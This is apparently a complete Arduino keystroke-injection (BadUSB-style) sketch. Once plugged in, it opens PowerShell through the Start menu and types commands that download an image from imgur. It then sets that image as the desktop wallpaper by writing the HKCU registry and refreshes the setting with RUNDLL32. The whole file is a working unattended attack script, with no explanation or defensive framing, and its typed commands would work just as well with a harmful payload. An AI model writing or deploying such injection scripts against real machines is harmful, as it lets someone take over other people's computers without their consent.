#include "Keyboard.h"



void typeKey(int key){

Keyboard.press(key);

delay(50);

Keyboard.release(key);

}



void setup(){

Keyboard.begin();

delay(500);



delay(5000);



Keyboard.press(KEY_LEFT_CTRL);

Keyboard.press(KEY_ESC);

Keyboard.releaseAll();



delay(100);



Keyboard.print("power shell");



typeKey(KEY_RETURN);



delay(1000);

Keyboard.print("$client = new-object System.Net.WebClient");

typeKey(KEY_RETURN);

Keyboard.print("$userpath = $Env:USERPROFILE");

typeKey(KEY_RETURN);



Keyboard.print("$client.DownloadFile(\"http://i.imgur.com/08bID90.jpg\", \"08bID90.jpg\")");

typeKey(KEY_RETURN);

delay(4000);



typeKey(KEY_RETURN);



delay(300);

Keyboard.print("Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value \"$($userpath)\\08bID90.jpg\"");

typeKey(KEY_RETURN);



Keyboard.print("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");

typeKey(KEY_RETURN);



delay(300);



Keyboard.end();

}





/* Unused endless loop */

void loop() {}
